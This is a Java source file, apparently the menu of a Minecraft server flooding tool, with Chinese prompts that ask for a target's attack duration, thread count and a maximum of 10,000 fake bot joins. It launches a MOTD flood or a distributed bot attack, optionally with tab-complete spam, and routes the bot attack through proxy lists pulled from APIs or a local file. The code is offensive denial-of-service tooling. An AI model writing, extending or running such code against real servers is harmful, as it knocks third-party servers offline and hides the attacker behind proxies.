package net.emtips.endminecraftplusplus.main;


import java.util.HashMap;
import java.util.Scanner;

import static net.emtips.endminecraftplusplus.utils.mainUtils.getCo;
import static net.emtips.endminecraftplusplus.utils.mainUtils.log;
import net.emtips.endminecraftplusplus.proxy.ProxyPool;
import net.emtips.endminecraftplusplus.ATTACK.DistributedBotAttack;
import net.emtips.endminecraftplusplus.ATTACK.IAttack;
import net.emtips.endminecraftplusplus.ATTACK.MotdAttack;

public class Menu {
    private String ip;
    private Scanner scanner;
    private int port;

    public Menu(Scanner sc, String ip, int port) {
        this.ip = ip;
        this.port = port;
        this.scanner = sc;
    }

    public void _1() {
        log("MOTD攻击选择");
        log("请输入攻击时间(单位：蛤)(60)");
        int time = getCo(scanner.nextLine(),60);
        log("请输入线程数(10)");
        int thread = getCo(scanner.nextLine(),16);
        IAttack attack = new MotdAttack(time,thread,0,false,false,null);
        attack.start(ip, port);
    }

    public void _2() {
        log("分布式假人压测选择", "请输入攻击时长！(3600s)");
        int time = getCo(scanner.nextLine(),3600);
        log("请输入最大攻击数(10000)");
        int maxAttack = getCo(scanner.nextLine(),10000);
        log("请输入每次加入服务器间隔(ms)");
        int sleepTime = getCo(scanner.nextLine(),0);
        log("请输入是否开启TAB攻击 y/n，默认关闭(n)");
        boolean tab = getCo(scanner.nextLine(),"n").equals("y");
        log("请输入是否开启操死乐乐模式 y/n，默认关闭(n)");
        boolean lele = getCo(scanner.nextLine(),"n").equals("y");
        getProxy();
        IAttack attack = new DistributedBotAttack(time,maxAttack,sleepTime,lele,tab,new HashMap<String,String>());
        attack.start(ip, port);
    }

    public void getProxy() {
        log("请输入代理ip列表获取方式（1）： 1.通过API获取 2.通过本地获取 3.通过本地+API获取");
        switch (getCo(scanner.nextLine(),1)) {
            case 1:
                ProxyPool.getProxysFromAPIs();
                ProxyPool.runUpdateProxysTask(1200);
                break;
            case 2:
                ProxyPool.getProxysFromFile();
                break;
            case 3:
                ProxyPool.getProxysFromFile();
                ProxyPool.getProxysFromAPIs();
                ProxyPool.runUpdateProxysTask(1200);
                break;
            default:
                ProxyPool.getProxysFromAPIs();
                ProxyPool.runUpdateProxysTask(1200);
        }
    }
}
